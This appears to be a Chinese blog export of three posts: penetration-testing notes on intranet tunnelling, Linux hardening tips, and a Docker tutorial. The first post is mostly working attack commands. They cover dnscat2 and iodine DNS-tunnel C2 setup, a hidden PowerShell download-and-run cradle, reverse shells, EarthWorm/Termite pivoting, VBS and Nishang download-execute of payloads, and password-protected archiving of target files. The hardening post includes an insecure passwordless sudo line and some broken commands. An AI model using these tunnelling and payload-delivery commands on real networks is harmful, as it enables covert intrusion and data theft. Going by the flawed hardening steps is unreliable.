指定多线程数量，默认为16个线程 -vV # 显示详细过程 3.DNS协议(重点)虽然激增的DNS流量可能会被发现，但基于传统的Socket隧道已经濒临淘汰以及TCP、UDP通信大量被防御系统拦截的状况，DNS、ICMP、HTTP/HTTPS等难以被禁用的协议已经成为i攻击者控制隧道的主要渠道DNS是一个不可缺少的服务；另一个方面，DNS报文具有穿透防火墙的能力；也由于防火墙和IDS等大都不会过滤DNS流量，也为DNS成为隐蔽信道创造了条件 C&amp;C(Command and Control Server, 命令控制服务器) – 用来管理僵尸网络和进行APT攻击的服务器分为：C&amp;C服务端，C&amp;C客户端由于安全厂商各种措施阻断了C&amp;C通信，通过各种隧道技术实现C&amp;C通信的技术(特别是DNS隧道技术)出现了 DNS隧道原理： DNS查询的域名不存在，会去外网DNS服务器进行查询。如果互联网上有一台定制的服务器，依靠DNS协议即可进行数据包的交换。 在使用DNS隧道与外部进行通信时，从表面看是没有连接外网的(内网网关没有进行转发数据包)，但实际上，内网的DNS服务器进行了中专操作。 就是将其他协议封装在DNS协议中进行传输。 查看DNS的联通性 # 查询当前内部域名和IP地址 cat /etc/resolve.conf |grep -v '#' # 查看能否与内部DNS通信意味着可以使用DNS隧道 nslookup hacker.testlab # 查看能否通过DNS服务器解析外部域名(如果可以，就意味着可以使用DNS隧道实现隐蔽通信) nslookup baidu.com 1).dnscat2工具下载地址：https://github.com/iagox86/dnscat2https://downloads.skullsecurity.org/dnscat2/https://github.com/lukebaggett/dnscat2-powershell 使用DNS协议创建加密的C&amp;C通道通过预共享密钥进行身份验证使用Shell及DNS查询类型(TXT, MX, CNAME, A, AAAA)，多个同时进行的会话类似与SSH中的隧道 客户端是用C写的，服务端是用Ruby写的 dnscat2的隧道有两种模式： - 直连模式：客户端直接向指定IP地址的NDS服务器发起DNS解析请求 - 中继模式：DNS经过互联网的迭代解析，指向指定的DNS服务器(速度较慢) 如果目标内网放行所有的DNS请求，dnscat2会使用直连模式，通过UDP的53端口进行通信(不需要域名，速度快，而且看上去仍然像普通的DNS查询)。在请求日志中，所有的域名都是以dnscat开头的，因此通信容易检测。 如果目标内网中请求仅限于白名单服务器或特定的域，dnscat2会使用中继模式来申请一个域名，并将运行dnscat2读无端的服务器指定为受信任的DNS服务器 DNS隧道应用场景： 在安全策略严格的内网环境中，只允许白名单流量出站，同时其他端口都被屏蔽，传统的C&amp;C通信无碍建立，这时候Red Team还有一个选择：使用DNS隐蔽隧道建立通信 dnscat2特点： - 支持多个会话 - 流量加密 - 使用密钥方式MiTM攻击 - 在内存中直接运行Powershell脚本 - 隐蔽通信 使用1.部署域名解析 # vps(Linux)作为C&amp;C服务端，并需要一个域名(godaddy网站。选择不显眼的域名，选择不实名的，国外的，尽量短) 1.创建A记录，把自己的域名解析服务器指向vps的ip(这里假设起名字ns1.360bobao.xyz) 2.创建NS记录，将dnsch子域名的解析结果指向A记录(名称为vpn指向ns1.360bobao.xyz) # 检测A类解析和NS解析是否成功 在vps上抓包： tcpdump -n -i eth0 udp dst port 53 解析测试(nslookup或dig)： nslookup xxxxx.xxxx.xxxx #如果能抓到对你域名进行查询的DNS请求数据包，就说明第二条NS就诶系设置已经生效 2.安装dnscat2服务端(在vps上) # 先配置Ruby环境，kali内置了Ruby环境，但是运行时候可能缺少一些gem依赖包 # 这里使用ubuntu server apt-get install gem apt-get install ruby-dev apt-get install libpq-dev apt-get install ruby-bundlers git clone https://github.com/iagox86/dnscat2.git cd dnscat2/server bundle install # 启动服务端b sudo ruby ./dnscat2.rb vpn.360bobao.** -e open -c pass123456 --no-cache # 如果是采用的直连模式，输入以下命令 sudo ruby ./dnscat2.rb --dns server=127.0.0.1,port=553,type=TXT # 以上命令表示：监听本机的553端口，自定义连接密码pass123456 # 参数 -c # 定义了"pre-shared secret",可使用具有预共享密钥的身份验证机制来防止中间人攻击。如果不指定，会自动生成随机字符串(记录下来，客户端需要使用) -e # 规定安全级别。"open" 表示服务端允许客户端不进行加密 --no-cache # 禁止缓存(该参数务必要添加，因为power-dnscat2客户端与dnscat2服务器的Caching模式不兼容) 3.目标主机安装客户端 # dnscat2 客户端是C写的，所以先编译。win上可使用vs编译；Linux中直接运行`make install` git clone https://github.com/iagox86/dnscat2.git cd dnscat2/client make # 这里使用的是直接编译好的win系统上的客户端：https://downloads.skullsecurity.org/dnscat2 # 服务端建好之后，在客户端运行测试能否与服务端通信 dnscat2-v0.07-client-win32.exe --ping vpn.360bobao.xyz # 在客户端连接服务端 dnscat2-v0.07-client-win32.exe --dns domain=vpn.360bobao.xyz --secret pass123456 # 如果成功，会显示"Session established!" # 如果服务端使用的是直连模式，可以直接填写服务端ip地址(不通过DNS服务提供商)，向dnscat2服务端所在的IP弟子和请求DNS解析，命令如下 dnscat --dns server &lt;dnscat2_server_IP>,port=53,type=TXT --secret=pass123456 # 推荐使用Powershell版本的dnscat2-powershell(目标win机器需要支持powershell2.0以上版本)：https://github.com/lukebaggett/dnscat2-powershell #下载脚本到本地执行： Import-Module .dnscat2.ps1 #也可在线加载脚本： IEX(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1"); start-Dnscat2 -Domain vpn.360bobao.xyz -DNSServer ***.***.***.*** # 也可以用以下命令，使用IEX加载脚本的方式，在内存中打开dnscat2客户端 powershell.exe -nop -w hidden -c {IEX(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1");start-Dnscat2 -Domain vpn.360bobao.xyz -DNSServer ***.***.***.***} # 执行命令，创建控制台，然后就可以执行powershell命令和脚本 exec psh 4.反弹shell # 交互shell， 和Metasploit类似 # 在客户端运行dnscat2.ps1脚本，在服务端就能看到客户端上线的提示 # 常用命令： windows # 查看当前的控制进程(每个连接都是独立的) sessions # 同同上 session --I 1 # 进入某个通道 window -i 1 exec notepad.exe # 远程打开指定程序 download # 下载文件(慢，先把所有数据先写入缓存，最后写入硬盘) 不适合大文件 upload # 上传文件() clear # 清屏 delay # 修改远程响应延时 shell # 得到一个反弹shell suspend # 返回上一层，相当于快捷键"ctrl+z" listen # 类似SSH隧道的—L参数(本地转发)，如：listen 0.0.0.0:53 192.168.1.1:3389 ping # 确认主机在线，如果返回"pong"，则在线 shutdown # 切断当前会话 quit # 推出dnscat2控制台 kill &lt;id> # 切断通道 set # 设置值，例如：security=open 支持多域名并发，可将多个子域绑定在同一个NS下，然后在服务端同时接收多个客户端连接 ruby dnscat2.rb --dns=port53532 --security=open start --den domain=&lt;domain.com>,domain=&lt;domain.com> 2).iodine工具下载地址：https://github.com/Al1ex/iodine官方文档：http://code.kryo.se/iodine iodine可以的通过一台DNS服务器制造一个IPv4数据通道，特别适合在目标主机只能发送DNS请求的网络环境中使用。C语言开发，分为服务端程序iodined和客户端程序iodine, Kali内置了iodine 特点： - 不会对下行数据进行编码 - 支持多平台，包括Linux,BSD,Mac OS, Windows - 支持强制密码机制 - 支持同网段隧道IP地址(不同服务器-客户端网段) - 支持多种DNS记录类型 - 提供了丰富的隧道质量检测措施 支持直接转发和中继两种模式 原理：通过TAP虚拟网卡，在服务端建立一个局域网；在客户端，通过TAP建立一个虚拟网卡；两者通过DNS隧道相连，处于同一个局域网(可ping通)。在客户端和服务端之间建立连接后，客户机会多出一块名为”dns0”的虚拟网卡。 使用0.先准备域名(和上面类似)域名服务商：namecheap增加A记录，NS记录测试DNS是否解析成功 1.安装服务端 apt-get install iodine # 启动 iodined -f -c -P pass123456 192.168.1.1 vpn.360bobao.xyz -DD # 192.168.0.1是虚拟的ip # 参数含义： -f # 前台运行 -c # 禁止检查所有传入请求客户端IP地址 -P # 设置验证密码 -D # 指定调试等级 -DD指第二级， D的数量随等级增加 # 检查配置是否正确 https://code.kryo.se/iodine/check-it 直接输入域名进行检查 2.安装iodine客户端 ## 安装 # win 下载win编译好的版本，同时下载openvpn或者TAP网卡驱动程序(安装时仅选择TAP-Win32驱动) # Linux apt-get install iodine ## 启动客户端 ​```bash # win(打开里面win32的bin,需要管理员权限) lodine.exe -f -P pass123456 vpn.360bobao.xyz #如果出现"COnnection setup complete,tranmitting data"就表示成功 # Linux lodine -f -P pass123456 vpn.360bobao.xyz -M 200 # 测试能否使用(客户端与服务端已经属于同一内网了) ping 192.168.1.1 # 虚拟出来的服务端的网卡ip ## 参数： -r 强制在任何情况下使用DNS隧道(因为有时候会自动动切换为UDP隧道) -M 指定上行主机名的大小 -m 调节最大下行分片的大小 -T 指定所使用的DNS请求的类型。可选：NULL,PRIVATE,TXT,SRV,CNAME.MX,A -O 指定数据编码规范 -L 指定是否开启懒惰模式(默认开启) -I 指定请求与请求之间时间间隔 3.使用DNS隧道 # 由于客户端与服务端已经属于同一内网了，所以直接访问即可 mstsc 192.168.128:3389 # 等方法 # route 可以查看到路由 防御DNS隧道的方法 禁止网络中任何人向外部服务器发送DNS请求，只允许与受信任的DNS服务器通信 虽然没有人会将TXT解析请求发送给DNS服务器，但是dnscat2和邮件服务器/网关会这样做。因此可以将邮件服务器/网关列出白名单并组织传入和传出流量中TXT请求 跟踪用户的DNS查询次数。如果达到阈值，就生成相应的报告 阻止ICMP 各种隧道技术的优劣 根据实际环境选择技术DNS+SSH隧道结合 SOCKS代理 常见的网络场景 1.服务器在内网，可以任意访问外部网络 2.服务器在内网，可以访问外部网络，但服务器安装了防火墙来拒绝敏感端口的连接 3.服务器在内网，对外只开放了部分端口(如80端口)，且服务器不能访问外部网络 SOCKS是一种代理服务，可简单的将一端的系统连接另一端。SOCKS支持多种协议。SOCKS分为SOCKS4和SOCKS5。SOCKS4只支持TCP协议，SOCKS5不仅支持TCP/UDP，还支持各种身份验证机制等，标准端口为1080。SOCKS能与目标内网计算机进行通信，避免多次使用端口转发。 常见SOCKS代理工具可理解为增强版的lcx。他在服务端监听一个端口，当有新连接出现时，会先从SOCKS协议中解析出目标的URL的目标端口，再执行lcx的具体功能socks代理工具尽量选则小且命令行的 1. EarthWorm(EW)跨平台，SOCKS5架构，能以正向、反向、多级级联等方式建立网络隧道下载地址：https://github.com/rootkiter/EarthWorm新版本Termite: https://github.com/rootkiter/Termite 2. reGeorg(reDuh的升级版)可以使目标服务器在内网中(或者在设置了端口策略的情况下)连接内部开发端口利用webshell建立一个socks代理进行内网穿透，服务器必须支持ASPX, PHP, JSP中的一种。 3. sSocks支持SOCKS5验证，支持IPv6和UDP，并提供反向SOCKS代理服务(将远程计算机作为SOCKS代理服务端反弹到本地) 4. SocksCap64http://www.sockscap64.comwindows上的全局代理软件即便是本身不支持SOCKS代理的应用程序，也可以通过其实现代理访问 5. Proxifierhttps://www.proxifier.com/ 6. ProxyChainshttp://proxychains.sourceforge.net/https://github.com/haad/proxychainsLinux下实现全局代理的软件，可以使任何程序通过代理上网，允许TCP和DNS流量通过代理隧道，支持HTTP、SOCKS4、SOCKS5类型的代理服务器 工具使用1. EarthWorm(EW)六种命令格式： ssocksd # 用于普通网络环境的正向连接命令 rcsocks # 用于普通网络环境的反向连接命令 rssocks lcx_slave lcx_listen lcx_tran 正向SOCKS 5 服务器 # 适用于目标机器拥有一个外网ip的情况 ew -s ssocksd -l 888 # 假设一个端口为888的SOCKS代理 # 接下来，可以使用SocksCap64添加这个代理地址即可 反弹SOCKS 5 服务器 # 目标机器没有公网IP地址的情况 / 或者在内网内部用 #1.先把ew上传到公网vps中，并执行 ew -s rcsocks -l 1008 -e 888 # 含义：在公网vps上添加一个转接隧道，把1008收到的代理请求转发给888端 #2.然后把ew上传到web服务器(内网)，并执行 ew -s rssocks -d &lt;公网vps_IP> -e 888 #3.然后用SocksCap64等添加代理地址为vps的ip:1008 #4.回到vps发现反弹成功，就可以通过vps的1008端口使用假设在web服务器上的SOCKS5代理服务了 多级级联：Case1. lcx_tran # 情景：vps能连接web服务器，web服务器能连接数据库服务器但是不能连接DC，数据库服务器能连接DC但是不能访问外网 # 所以，在数据库服务器建立SOCKS服务，端口转发给web服务器，我们可以直接链接web服务器 # 1.在DB服务器 ew -s ssocksd -l 9999 # 2.在vps ew -s lcx_tran -l 1008 -f 127.0.0.1 -g 9999 # 3.使用工具连接vps1008即可 Case2. lcx_listen, lcx_slave #1. vps ew -s lcx_listen -l 1080 -e 8888 #2. DB内网主机 ew -s ssocksd -l 9999 #3. 另一台内网主机 ew -s lcx_slave -d 192.168.0.100 -e 8888 -f 1.1.1.10 -g 9999 #4. 最后连接vps的1080端口 三级级联 #1. vps(192.168.0.103) ew -s lcx_listen -l 1001 -e 113 #2.A ew -s lcx_slave -d 192.168.0.103 -e 113 -f 1.1.1.10 -g 123 #3. B(1.1.1.10) ew -s lcx_listen -l 123 -e 133 #4. C主机，启动SOCKS 5服务，并反弹到B主机的123端口 ew -s rssocks -d 1.1.1.10 -e 133 #5. 使用代理工具连接vps的1001 2.Termite 分为两部分：admin_exe和agent_exe被控者 # Usage 1. 以服务模式启动一个agent服务。 > $ ./agent -l 8888 2. 令管理端连接到agent并对agent进行管理。 > $ ./admin -c 127.0.0.1 -p 8888 3. 此时，admin端会得到一个内置的shell, 输入help指令可以得到帮助信息。 >> help 4. 通过show指令可以得到当前agent的拓扑情况。 >> show 0M +-- 1M 由于当前拓扑中只有一个agent，所以展示结果只有 1M , 其中1 为节点的ID号， M为MacOS系统的简写，Linux为L，Windows简写为W。 5. 将新agent加入当前拓扑 > ./agent -c 127.0.0.1 -p 8888 6. 此时show指令将得到如下效果 0M +-- 1M | +-- 2M 这表明，当前拓扑中有两个节点，其中由于2节点需要通过1节点才能访问，所以下挂在1节点下方。 7. 在2节点开启socks代理，并绑定在本地端口 >> goto 2 将当前被管理节点切换为 2 号节点。 >> socks 1080 此时，本地1080 端口会启动个监听服务，而服务提供者为2号节点。 8. 在1号节点开启一个shell并绑定到本地端口 >> goto 1 >> shell 7777 此时，通过nc本地的 7777 端口，就可以得到一个 1 节点提供的 shell. 9. 将远程的文件下载至本地 >> goto 1 >> downfile 1.txt 2.txt 将1 节点，目录下的 1.txt 下载至本地，并命名为2.txt 10. 上传文件至远程节点 >> goto 2 >> upfile 2.txt 3.txt 将本地的 2.txt 上传至 2号节点的目录，并命名为3.txt 11. 端口转接 >> goto 2 >> lcxtran 3388 10.0.0.1 3389 以2号节点为跳板，将 10.0.0.1 的 3389 端口映射至本地的 3388 端口 # 更多支持 http://rootkiter.com/toolvideo/toolmp4/1maintalk.mp4 http://rootkiter.com/toolvideo/toolmp4/2socks.mp4 http://rootkiter.com/toolvideo/toolmp4/3lcxtran.mp4 http://rootkiter.com/toolvideo/toolmp4/4shell.mp4 http://rootkiter.com/toolvideo/toolmp4/5file.mp4 # 联系作者 rootkiter@rootkiter.com 3. 在Windows下使用SocksCap64实现内网漫游代理服务器先设置：ew -s lcx_listen -l 10800 -e 888 以管理员权限打开1.点击代理，添加一个代理(代理服务器的ip和端口)2.点击闪电图标，测试代理服务器是否正常3.选择浏览器，右键，选择在代理隧道中运行选择程序，然后就可以自由访问内网了 4. 在Linux下使用ProxyChains实现内网漫游 # kali中安装了ProxyChains，只需配置即可 # vim /etc/proxychains.conf 取消 dynamic_chain 的注释 修改 socks 127.0.0.1 1080 为自己的端口 # 测试是否正常 proxyresolv www.baidu.com # 如提示没找到命令 cp /usr/lib/proxychains3/proxyresolv /use/bin/ # 启动火狐浏览器(使用socks代理) proxychains firefox # 可以访问到内网的站点 # 同样nmap，sqlmap，msf都可以以代理方式运行 proxychains nmap 192.168.0.1/24 proxychains sqlmap -u 192.168.0.12 proxychains msfconsole 压缩数据 1. RAR如果目标安装了win.rar，则不必再安装；如果没有安装，则手动安装与系统版本对应的，然后把win.exe拿出来 参数: a 添加要压缩的文件 -k 锁定压缩文件 -s 生成存档文件(提高压缩比) -p 指定压缩密码 -r 递归压缩 -x 指定要排除的文件 -v 分卷打包(大文件时候用处很大) -ep 从名称中排除路径 -ep1 从名称中排除基本目录 -m0 存储，添加到压缩文件时不压缩 -m1 最快，使用最快压缩方式(低压缩比) -m2 较快，使用快速压缩方式 -m3 标准，使用标准压缩方式(默认) -m4 较好，使用较强压缩方式(速度较慢) -m5 最好，使用最强压缩方式(最好的压缩方式，但速度最慢) 以RAR格式压缩/解压 # 压缩 rar.exe a -k -r -s -m3 C:\\1.rar C:\\apps # 解压 rar.exe e C:\\1.rar # -e # 解压到当前根目录下 -x # 以绝对路径解压 # zip和rar一样，修改后缀即可 分卷压缩/解压 # 压缩(每个卷的大小为20MB) rar.exe a -m0 -r -v20m C:\\1.rar C:\\apps # 解压 rar.exe x C:\\1.part01.rar C:\\apps 2. 7-Zip下载地址：https://www.7-zip.org/参数： -r 递归压缩 -o 指定输出目录 -p 指定密码 -v 分卷压缩 a 添加压缩文件 x 解压 普通压缩/解压方式 # 压缩 7z.exe a -r -p123456 C:\apps\1.7z C:\apps # 解压 7z.exe x -p123456 C:\apps\1.7z -o C:\apps2 分卷压缩/解压方式 # 压缩（每个分卷20MB） 7z.exe a -r -vlm -p123456 C:\apps\1.7z C:\apps # 解压 7z.exe x -p123456 C:\apps\1.7z.001 -o C:\apps2 上传和下载 对于不能上传Shell，但是可以执行命令的Windows服务器，可在shell环境中进行上传下载操作 1.利用FTP上传文件在本地或vps搭建FTP服务器 常用FTP命令 open 192.168.0.10 # 连接服务器 cd &lt;目录> lcd &lt;文件夹路径> # 定位本地文件夹(上传文件的位置或者下载文件的保存位置) type # 查看的当前的传输方式(默认是ASCII码传输) ascii # 设置传输方式为ascii（传输txt等） binary # 设置传输方式为二进制传输（传输exe图片视频声音等） close # 结束与服务器的FTP对话 quit # 结束与服务器的FTP对话并推出FTP环境 put &lt;文件名> [newname] # 上传，如果不指定newname，就为原名字 send &lt;文件名> [newname] # 上传，如果不指定newname，就为原名字 get &lt;文件名> [newname] # 下载，如果不指定newname，就为原名字 mget filename [filename] # 下载多个文件。支持空格和"?"两个通配符（比如: mget .mp3 表示下载FTP服务器当前目录下拓展名为mp3的文件） 2. 利用VBS上传文件主要是是使用msxm12.xmlhttp和adoab.stream 上传 下载 //把下面的命令以此保存到文件（比如 echo "xxxxxxx" >> download.vbs） Set Post = CreateObject("Msxm12.XMLHTTP"); Set Shell = CreateObject("Wscript.Shell"); Post.Open "GET","http://xxxx/target.exe" Post.Send(); Set aGet = CreateObject("ADODB.Stream"); aGet.Mode = 3 aGet.Type = 1 aGet.Open() aGet.Write(Post.responseBody); aGet.SaveToFile "C:\\test\target.exe",2 //保存为download.vbs后，然后执行下面的命令 cscript download.vbs 3. 利用Debug上传原理：将需要上传的exe文件转换为16进制hex形式，再通过echo命令将hex代码写入文件，最后利用Debug功能将hex代码编译并还原为exe文件 # exe2bat.exe 只支持&lt;64KB的文件，方法也较古老 # kali中，exe2bat.exe位于/usr/share/windows-binaries目录下。 # 1.在该目录下执行如下命令，把需要上传的ew.exe文件转换成hex形式 wine exe2bat.exe ew.exe ew.txt # 这里，测试ew.exe代理工具 # 2.然后把上面生成的文本内容复制，echo到目标系统的某个空文件。依次执行命令，生成1.dll, 123.hex, ew.exe copy 1.dll ew.exe 4. 利用Nishang上传# nishang中的脚本：Download_Execute --> 常用来下载文本文件并将其转为exe文件 #1. 先echo 方法把脚本内容传到目标机器，并将扩展名改为ps1 #2. 利用nishang中的exetotext.ps1脚本将msf生成的msf.exe修改为文本文件msf.txt .\ExetoText c:\msf.exe c:\msf.txt #3. 调用Download_Execute来下载并执行该文件 Download_Execute http://xxxxxx/msf.txt #4. 回到msf的监听窗口，可以看到反弹的shell 5. 利用bitsadmin下载命令行工具(win xp之后自带的工具)， 通常同于创建下载和上传进程并检测其进展 如果渗透的目标主机使用了网站代理，并且需要活动目录证书，那么bitsadmin可以帮助解决下载文件的问题Note：bitsadmin不支持HTTPS和FTP协议，也不支持 win xp/ server 2003及以前的版本 6. 利用PowerShell下载Download() DownloadString() 。。。 整理了一天，越整越乱，头都大了，下次理清了再来优化 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>端口转发</tag>
        <tag>内网</tag>
        <tag>隧道技术</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux安全加固(初级)]]></title>
    <url>%2Fposts%2F55264%2F</url>
    <content type="text"><![CDATA[Linux安全加固一、安装和升级使用custom自定义安装,不必要的软件包尽量不装,如有必要给lilo/grub引导器加入口令限制, 安装完成后使用up2date或是apt(Debian)升级系统软件, 有时升级内核也是必要的。编辑 /etc/sudoers 添加下面内容test1 ALL=NOPASSWD:ALL 二、帐号安全1、一般服务器都是放在IDC机房,需要通过远程访问进行管理,要限制root的远程访问,管理员通过普通帐号远程登录,然后su到root,开发人员只使用普通帐号权限。 1) 在/etc/default/login 文件,增加一行设置命令: CONSOLE = /dev/tty01 2) 可以通过下面的脚本禁止对控制台的访问: #! /bin/sh cd /etc/pam.d for i in * do sed '/[^#].*pam_console.so/s/^/#/' foo &amp;&amp; mv foo $I done 3) 通过下面的措施可以防止任何人都可以su为root,在/etc/pam.d/su中添加如下两行。 auth sufficient /lib/security/$ISA/pam_rootok.so debug = auth required /lib/security/$ISA/pam_wheel.so group=wheel 然后把您想要执行su成为root的用户放入wheel组: usermod -G10 admin 2、编辑/etc/securetty, 注释掉所有允许root远程登录的控制台, 然后禁止使用所有的控制台程序, 其命令如下: rm -f /etc/security/console.apps/servicename 三、最少服务原则采用最少服务原则, 凡是不需要的服务一律注释掉。在/etc/inetd.conf中不需要的服务前加”#”, 较高版本中已经没有inetd, 而换成了Xinetd; 取消开机自动运行服务, 把/etc/rc.d/rc3.d下不需要运行的肥务的第一个字母”S”改成”K”,其他不变. 四、文件系统权限1) 找出系统中所有含s”位的程序,把不必要的”s”位去掉, 或者把根本不用的直接删除, 这样可以防止用户滥用及提升权限的可能性,其命令如下: find / -type f -perm -4000 -o -perm -2000 -print | xargs ls -lg 2) 把重要文件加上不可改变属性(一般情况不用这么做): chattr +i /etc/passwd Immutable, 系统不允许对这个文件进行任何的修改。如果目录具有这个属性, 那么任何的进程只能修改目录之下的文件,不允许建立和删除文件。 3) 找出系统中没有属主的文件: find / -nouser -o -nogroup 4) 找出任何都有写权限的文件和目录: find / -type f -perm -2 -o -perm -20 |xagrs ls -lg find / -type d -perm -2 -o -perm -20 |xagrs ls -ldg 5)ftp的上传目录不能给与执行权限, 如提供可运行CGI的虚拟主机服务, 应该做额外安全配置.编辑/etc/security/limits.conf, 加入或改变如下行: hard core 0 hard rss 5000 hard nproc 20 五.Banner伪装1)入侵者通常通过操作系统、服务及应用程序版本来攻击, 漏洞列表和攻击程也是按此来分类, 所以我们有必要作点手脚来加大入侵的难度。所以编辑/etc/rc.d/rc.local如下: echo "Kernel $(uname -r) on $a $(uname -m)" >/etc/issue echo "Kernel \r on an \m" >> /etc/issue cp -f /etc/issue /etc/issue.net echo >> /etc/issue 2)对于Apache的配置文件,找到ServerTokens和ServerSignature两个directive,修改其默认属性如下,使用不回显版本号: ServerTokens prod ServerSignature Off 六、IPTABLES防火墙规则:iptables -A INPUT -p --dport 22 -j ACCEPT iptables -A INPUT -i eth0 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT iptables -A INPUT -j DROP 以上规则将阻止由内而外的TCP主动选接。上面是一个简单例子,IPTABLES功能十分强大, 可以根据具体情况设置防火墙规则。 七、tripwiretripwire是一个比较有名的工具,它能帮你判断出一些重要系统文件是否被修改过。现在的Linux发行版中一般部带有该工具的开源版本,在默认的校验对象配置文件中加入一些敏感文件就可以使用。 八.自行扫描普通的安全加固基本上是做完了,我们可以自己做一个风险评估 ,推荐使用nessus或其他工具。 九.日志策略主要就是创建对人侵相关的重要日志的硬拷贝, 不致于应急响应的时候连最后的黑匣子都没有。可以把它们重定向到打印机, 管理员邮件, 独立的日志服务器及其热备份。 十.Snort入侵检测系统对人侵响应和安全日志要求较高的系统有此必要；对于一般的系统而言, 如果管理员根本不会去看一大堆日志, 那么它白白占用系统资源, 就如同鸡肋一样。对Linux平台下病毒的防范总结出以下几条建议, 仅供参考: (1) 做好系统加固工作。 (2) 留心安全公告,及时修正漏洞。 (3) 日常操作不要使用root权限进行。 (4) 不要随便安装来历不明的各种设备驱动程序。 (5) 不要在重要的服务器上运行一些来历不明的可执行程序或脚本。 (6) 尽量安装防毒软件,并定期升级病毒代码库。 (7) 对于连接到Internet的Linux服务器,要定期检测Linux病毒、蠕虫和木马是否存在。 (8) 对于提供文件服务的Linux服务器,最好部署一款可以同时查杀Windows和Linux病毒的软件。 (9) 对于提供邮件服务的Linux服务器,最好配合使用一个E-mail病毒扫描器。 总而言之，对于Linux平台下病毒的防范要采取多种手段，决不可因为现在Linux病毒很少就掉以轻心。 有些配置文件可能已经过时了，可以根据自己的系统继续加固，未完待续… …参考的某个资料，但是找不到原文链接了 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>安全加固</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntu server-容器]]></title>
    <url>%2Fposts%2F25260%2F</url>
    <content type="text"><![CDATA[容器 有了新武器，并不表示旧武器没有用 题外话 容器 SDN -&gt; 软件定义网络 容器 -&gt; 基于操作系统内核，共享宿主机的CPU -&gt; 操作系统的进程之间进行隔离 -&gt; 安全性比虚拟机差一些 -&gt; 可移植性 什么是容器有个感性的认识即可，现在还没有明确的统一定义，根据不同产品具体理解 常见的容器技术Docker vs LXD/LXC 不同容器的程序的pid可以相同 越狱 Docker 应用程序方面的容器 Docker引擎只可以直接运行在Linux系统上 利用'Boot2Docker'等适配器帮助，使用轻量级'Linux vm'可在mac和微软系统上运行 安装Docker引擎(两种方法)uname -m # 仅64位系统保障(但32位系统可用) ##### 第一种办法：直接从ubuntu软件包安装(比较旧), 已经有一个老版本ubuntu包名为docker， sudo apt install docker.io systemctl status docker # 将当前用户加入docker组(不用sudo了) sudo usermod -aG docker ${USER} # 重启 ##### 第二种办法： # 安装依赖包 udo apt-get install apt-transport-https ca-certificates curl software-properties-common # 添加docker官方GPG key(防止伪造,供应链攻击) url -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add - # 添加docker官方库更新源 sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable" # 安装 sudo apt update sudo apt-get install docker-ce # 社区版本 客户端工具: docker 基本命令# 查看信息 docker version docker info # 查看运行了几个容器 # Registry: 应用程序的仓库(基本linux映像，) # 搜索镜像(有官方有个人的: 用户名/容器名) --> 建议下载官方的image然后自己打造容器 docker search apache2 # 下载镜像 docker pull hello-world # 下载时候指定-a（会下载所有版本） docker pull hello-world -a # 查看镜像 docker images # 运行容器 docker run busybox echo "hello" # 删除image docker rmi busybox:1-musl Docker基本概念Docker 映像 组成应用程序运行所需的全部文件合集 只读/读写 分层结构(每次对映像的修改都通过commit形成一个新层) 容器层 是基于映像可读写的顶层 映像层所有的Docker映像都源自于一个基础镜像(Debian/Ubuntu) –&gt; 只读，不可修改i 其他的功能模块附加于基础影像形成最终程序 Docker images 是构建Docker container的基础 Docker 层/容器层 每个映像有唯一的ID(SHA256/ 取前6字节来显示) docker images # 可看到唯一的image id # TAG: 默认是最新版本(latest) docker images --no-trunc # 可以看到完整的SHA256完整的字节 Docker容器images是只读的，在基础上创建并运行容器(可读写) # 查看运行的容器（每个容器都有唯一的id） docker ps # 不显示关闭的容器 docker ps -a # 显示所有状态的容器 #显示字段： 有容器id, 基于image的名字，command, 容器创建时间， status, ports, names(随机生成的,可以改) # 基于image运行容器(每次运行一次都产生一个新的容器!) docker run busybox echo "hello" docker run busybox:1-uclibc echo "hello" # 指定标签来用哪个(如果本机没有，会自动pull) # docker run -i -t busybox:ubuntu-16.04 # 删除容器 docker stop d751d48a6d0a # 如果运行了先stop掉 docker rm d751d48a6d0a pull的时候，默认会去一个人url地址寻找镜像 Docker Resigtry相当于目录，Repository相当于具体文件位置 可以自建映像库 Docker使用基本命令 # 运行镜像后交互登录入容器（这里基于ubuntu） # --name 修改容器的默认名字，指定 docker run --name xxx01 -it ubuntu /bin/bash # 退出 exit / ctrl + D # 退出容器终端，但退出不关闭容器 ctrl + P , ctrl + Q # 组合 # 启动容器 docker start id_id_id # 继续进入正在运行的容器 docker attach xxx01 # 重命名容器 docker rename 453dsdaojp test01 # 容器与镜像对比变化 docker diff 453dsdaojp test02 - C:修改了 - A:增加了 - D:删除了 ### 日常管理命令 docker start 453dsdaojp docker restart 453dsdaojp docker stop 453dsdaojp docker rename 453dsdaojp docker pause 453dsdaojp # 挂起 docker unpause 453dsdaojp # 恢复 创建映像 docker run -it ubuntu /bin/bash .... # 进入容器进行一些了修改 ctrl + p, ctrl + q docker commit test01 xps/test:0.1 # 创建了新的image # 然后可以上传到docker Resigtry # 后面就跟别的image一样使用可以创建容器等 后台运行容器 # 不进入交互方式的shell docker run -d ubuntu /bin/bash -c "while true; sleep 3; do date";done 查看日志 docker logs 453dsdaojp 实例 # 配置一个apache，并可以外部访问 docker run -dit -p 8080:80 ubuntu /bin/bash # 端口映射(外部:容器端口) 